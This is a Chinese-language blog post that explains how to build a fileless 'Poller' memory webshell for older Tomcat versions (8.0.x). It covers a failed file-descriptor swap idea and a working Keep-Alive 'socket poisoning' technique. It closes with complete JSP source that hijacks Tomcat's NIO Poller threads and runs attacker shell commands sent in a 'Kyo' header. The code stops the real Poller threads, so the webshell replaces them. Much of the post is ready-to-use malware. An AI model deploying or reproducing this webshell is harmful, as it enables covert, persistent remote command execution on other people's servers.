# 解决Poller(Executor)内存马的旧版本问题

>  前言
>
> 看了深蓝师傅挖掘新的Executor内存马时，我也欣然觉得既然都已经找到Socket层面上的处理类了，那一定也存在其他的内存马，所以我在Executor执行socket任务前的Poller做了尝试，发现一样可以。

Poller本质上就是深蓝师傅研究成果的延展，所以两者都存在一个问题：socket上的读缓存区需要回写。原因很简单，你需要读取请求并且分析请求中是否有Key来执行，即需要一个标识区别攻击者和正常用户。问题来了，读缓存区一旦读取，那么正常情况下是无法将数据放回去的，这就导致读缓冲区一旦read之后，如果是正常用户的请求，你此刻已经无法回写数据了，那么当HttpRequest做封装时，已经没有数据了，导致业务受到严重的影响。

幸好，tomcat8.5.0以后，在tomcat封装的socket支持unread的数据回写，这多亏了深蓝师傅的再一次输出。离谱的是，本人测试用的8.0.18刚好不支持unread，所以才有了自己的解决思路

## FD文件描述符的转换（失败）

我在看socket的底层封装时，发现Java本身也像Linux那样，用fd文件描述符来做引用。所有打开的文件（或者socket）都是由文件描述符引用的，打开一个现存的文件或者是创建一个新文件时，内核会向当前进程返回一个文件描述符，那么根据文件描述符就可以找到对应的文件。（熟悉Linux编程的应该能知道）

![img](https://cdn.nlark.com/yuque/0/2022/png/1599979/1660046549832-234997e0-24a4-42c8-9f79-a3407c1b9d0f.png)

这意味着其实fd指向位置就是缓冲区的数据，所以萌发了以下思考

![img](https://cdn.nlark.com/yuque/0/2022/png/1599979/1660049434909-37127316-8674-4d88-941b-4e74332c4ec7.png)

先在程序临时开辟一个socket（名称middle,端口随机），以及另一个连接socket（名称attack）。用一个临时的Bytebuf读取来自8080的http请求，接着判断是否为命令执行的请求，如果不是，attack连接middle，通过attack将Bytebuf数据write到middle。然后通过反射将midlle的fd和8080socket的fd进行互换，此时将业务正常进行。业务正常结束后，用反射再次将middle的fd和8080socket的fd互换，然后把middle和attack给close，并且结束本次http请求。实现已经找不到了，因为是失败的，我那时候太急了，没保留样本。

### 为什么会失败

追其根本在于多线程的问题，Poller会把任务交给SocketProcessor或者Executor之后，就不再理会这个请求了，而是继续监听下一个请求，而这两者又是以线程的形式进行。所以意味着你很难判断fd什么时候才要换回来，你不知道业务逻辑要跑多久，如果换早了，那么就没有响应体了，换晚了，那还好，没啥问题。但是怎么让程序滞后呢？Sleep显然太不靠谱了，如果业务本身就是需要很长的事件，你的Sleep是不是得继续加，不稳定！更有趣的是，我在用线程工具测试时，发现有的时候，响应体反而在请求头之前，还有的竟然会报乱码，实属拉跨

![img](https://cdn.nlark.com/yuque/0/2022/jpeg/1599979/1660050637981-3ee7c2b9-739e-4c42-b2b7-69f08e43728b.jpeg)

(比如，响应体下方多出个0，离谱。。。)

## 缓存解决，Socket毒化（稳定）

Poller在处理每一次socket的请求时，会把上一次socket的请求记录添加到本地socket的readbuf。是不是可以利用这个buffer达到不读socket的读缓冲区，从而拿到请求的数据。但是问题来了：这个buffer是上一个请求，所以你必须连发两次请求，这样才能拿到第一次带命令执行的请求。这理论上看上去只是存在一次命令两次请求的缺陷，但是细想，这很不安全！因为服务器同时接受很多用户的请求，突然那天你发个恶意请求，有个普通用户莫名其妙收到/etc/passwd文件的内容，这有点尴尬了。

![img](https://cdn.nlark.com/yuque/0/2022/png/1599979/1660051386824-93d3851c-98c0-467d-b486-598727df90f3.png)

解决的思路很简单，Keep-Alive。HTTP协议中Keep-alive不就是为了让客户端与服务端在同一个会话多次交互吗？只要在一个tcp会话不断开连接，就能做到身份验证的可能，所以有了以下解决方案：

![img](https://cdn.nlark.com/yuque/0/2022/png/1599979/1660054082135-604b3b4f-5789-40c1-85c8-ea5b59e3331a.png)

每次请求都在缓存加上本次通信的socket(IP+端口)，表明缓存的数据是由那个socket发起的，接着每当我们读readbuf的数据时，我们可以得到两个信息：第一，这个包存不存命令执行的口令，第二，这个包是哪个socket发出的。这样哪怕缓存的请求被用户发出，但是socket记录已经表明了谁发起的，此时自然匹配不到用户的socket。需要注意的是，毒化对象不可以是IP，因为如果遇到反向代理的情况，你毒化的可是整个nginx服务。至于什么时候需要删除毒化表中的数据，其实很简单，tomcat的监听是使用Selector做事件监听的，当有事件来时，Selector负责收集事件的类型，然后提交给业务处理，当业务处理时，程序会注销本次的事件，避免Selector反复提交相同事件。这里我们就不注销事件，让socket反复读数据，这样一旦客户端关闭，服务端sokcet在读的时候一定会报错抛出，在处理异常时，我们直接删除对应毒化表中的数据即可。

### 强依赖容器

通过图片可以看到，所有的事情都是建立在socket连接不中断的基础之上进行。但是在nginx反向代理中默认是采用端口轮询的形式进行通信，即第一次代理端口用22222，第二次就是22223...这样显然无法让socket毒化成功。所以，致命性很大。但是大部分nginx配置也都会加上keep-alive的支持。只能说有点看命的节奏。

最后附上内存马的实现

## Poller内存马

Poller内存马的逻辑还是比较简单，你只要继承tomcat本身的NioEndpoint.Poller，然后重写processKey方法即可，如果需要处理业务，就自己操作socket，如果放行业务，就直接把socket交给父类processKey实现即可。（以下实现比较easy，只能说是个demo功能罢了，仅供参考）

```yaml
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.tomcat.util.net.NioEndpoint" %>
<%@ page import="java.nio.channels.SelectionKey" %>
<%@ page import="org.apache.tomcat.util.net.NioChannel" %>
<%@ page import="java.nio.ByteBuffer" %>
<%@ page import="java.io.*" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="org.apache.tomcat.util.net.SocketStatus" %>
<%@ page import="java.util.regex.Pattern" %>
<%@ page import="java.util.regex.Matcher" %>
<%@ page import="java.nio.channels.SocketChannel" %>
<%@ page import="java.util.*" %>
<%!
    Set<Thread> badThread = new HashSet<>();
    String name = "";
    boolean can = true;

    public class Trojan extends NioEndpoint.Poller {

        private Set<String> map = new HashSet<>();

        private String template = "HTTP/1.1 200 OK\r\n" +
                "Server: Apache-Coyote/1.1\r\n" +
                "Content-Length: 11\r\n" +
                "Date: Fri, 05 Aug 2022 12:07:47 GMT \r\n\r\n";

        private ByteBuffer buffer = ByteBuffer.allocate(4096);

        private String type = "win";

        Trojan(NioEndpoint nioEndpoint) throws IOException {
            nioEndpoint.super();
            String property = System.getProperty("os.name");
            if(property.toLowerCase().contains("win")){
                type = "win";
            }else{
                type = "linux";
            }
        }

        public String getRequest(String request, String key) {
            Pattern compile = Pattern.compile(key, Pattern.DOTALL | Pattern.CASE_INSENSITIVE);
            Matcher matcher = compile.matcher(request);
            if (matcher.matches()) {
                String group = matcher.group(1);
                int i = group.indexOf("\r\n");
                return group.substring(0, i);
            } else {
                return null;
            }
        }

        public void sendResponse(NioChannel nioChannel, String response) {
            try {
                String encode = new String(Base64.getEncoder().encode(response.getBytes()),"gbk");
                String result = template + encode + "\0\r\n\r\n";
                nioChannel.write(ByteBuffer.wrap(result.getBytes()));
            } catch (IOException e) {
                try {
                    map.remove(nioChannel.getIOChannel().getRemoteAddress().toString());
                } catch (IOException ioException) {
                }
            }
        }

        public void handlerSocket(SelectionKey sk, NioEndpoint.KeyAttachment attachment) {
            NioChannel socket = attachment.getSocket();
            SocketChannel ioChannel = attachment.getSocket().getIOChannel();
            InputStreamReader reader = null;
            StringBuilder cmdBuffer = new StringBuilder();
            String request = null;

//        如果报错，说明此时客户端已经终止连接了，需要立刻清理毒化表
            try {
                ioChannel.read(buffer);
                request = getRequest(new String(buffer.array()), ".*Kyo:(.*)");
                buffer.clear();
            }catch (Exception e){
                try {
//                清理毒化表
                    map.remove(attachment.getSocket().getIOChannel().getRemoteAddress().toString());
                    return;
                } catch (IOException ioException) {
                }
            }

            /**
             * 命令执行
             */
            try{
                String[] cmds = new String[]{};
                if(type.equals("win")) {
                    cmds = new String[]{"cmd", "/c", request.trim()};
                }else{
                    cmds = new String[]{"bash", "-c", request.trim()};
                }

                Process exec = Runtime.getRuntime().exec(cmds);
                reader = new InputStreamReader(exec.getErrorStream(), "gbk");
                BufferedReader bufferedReader = new BufferedReader(reader);
                String temp = null;
                while ((temp = bufferedReader.readLine()) != null) {
                    cmdBuffer.append(temp + "\n");
                }
                if(cmdBuffer.length() == 0){
                    reader = new InputStreamReader(exec.getInputStream(), "gbk");
                    bufferedReader = new BufferedReader(reader);
                    temp = null;
                    while ((temp = bufferedReader.readLine()) != null) {
                        cmdBuffer.append(temp + "\n");
                    }
                }
            } catch (IOException e) {
                sendResponse(socket, "命令执行失败");
                return;
            }
            sendResponse(socket, cmdBuffer.toString());
        }

        @Override
        protected boolean processKey(SelectionKey sk, NioEndpoint.KeyAttachment attachment) {
            Boolean process = true;
            ByteBuffer readBuffer = attachment.getSocket().getBufHandler().getReadBuffer();
            String IDkey = null;
            try {
                IDkey = attachment.getSocket().getIOChannel().getRemoteAddress().toString();
            } catch (IOException e) {
            }

            //毒化的socket直接读取read
            if (map.contains(IDkey)) {
                handlerSocket(sk, attachment);
                return process;
            }

//        读取缓存Buffer
            String keyBad = getRequest(new String(readBuffer.array()), ".*Kyo:(.*)");
            if (keyBad != null) {
                String request1 = getRequest(new String(readBuffer.array()), ".*who:(.*)");
//            还未注册内存马就发送Kyo命令执行，此时readBuffer还未自动添加who，所以存在取不到的可能
                if(request1 !=null) {
//                socket毒化
                    map.add(request1.trim());
                }
            }

//        正常业务流程
            Boolean b =  super.processKey(sk, attachment);


            /**
             * readBuffer socket登记
             */
            ByteBuffer allocate = ByteBuffer.allocate(readBuffer.array().length);
            allocate.put(Arrays.copyOfRange(readBuffer.array(), 0, readBuffer.array().length - 30));
            allocate.put(("who: " + IDkey + "\r\n").getBytes());
            try {
                Field readbuf = NioEndpoint.NioBufferHandler.class.getDeclaredField("readbuf");
                readbuf.setAccessible(true);
                readbuf.set(attachment.getSocket().getBufHandler(), allocate);
            } catch (Exception e) {
            }
            return b;
        }
    }

    Object getField(Object object, String fieldName) {
        Field declaredField;
        Class clazz = object.getClass();
        while (clazz != Object.class) {
            try {

                declaredField = clazz.getDeclaredField(fieldName);
                declaredField.setAccessible(true);
                return declaredField.get(object);
            } catch (NoSuchFieldException | IllegalAccessException e) {
            }
            clazz = clazz.getSuperclass();
        }
        return null;
    }

    public  NioEndpoint.Poller getAPoller(){
        Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads");
        NioEndpoint.Poller target = null;
        for(Thread thread: threads){
            if(thread == null)
                continue;
            if(thread.getName().toLowerCase().contains("poller") && thread.getName().contains("http")){
                this.badThread.add(thread);
                if(target == null) {
                    this.name = thread.getName();
                    target = (NioEndpoint.Poller) getField(thread, "target");
                }
            }
        }
        return target;
    }

    NioEndpoint getNio(NioEndpoint.Poller poller){
        NioEndpoint root = (NioEndpoint) getField(poller, "this$0");
        return root;
    }
%>
<%

    NioEndpoint.Poller aPoller = getAPoller();
    NioEndpoint nio = getNio(aPoller);
    Trojan trojan = new Trojan(nio);
    Iterator<Thread> iterator = badThread.iterator();
    while (iterator.hasNext()){
        Thread next = iterator.next();
        next.stop();
    }
    Thread thread = new Thread(trojan, this.name);
    NioEndpoint.Poller[] pollers = (NioEndpoint.Poller[]) getField(nio, "pollers");
    Field pollers1 = null;
    try {
        pollers1 = NioEndpoint.class.getDeclaredField("pollers");
        pollers1.setAccessible(true);
        pollers1.set(nio, new NioEndpoint.Poller[]{trojan});
    } catch (NoSuchFieldException | IllegalAccessException e) {
        e.printStackTrace();
    }
    thread.setPriority(Thread.MIN_PRIORITY);
    thread.setDaemon(true);
    thread.start();
%>
```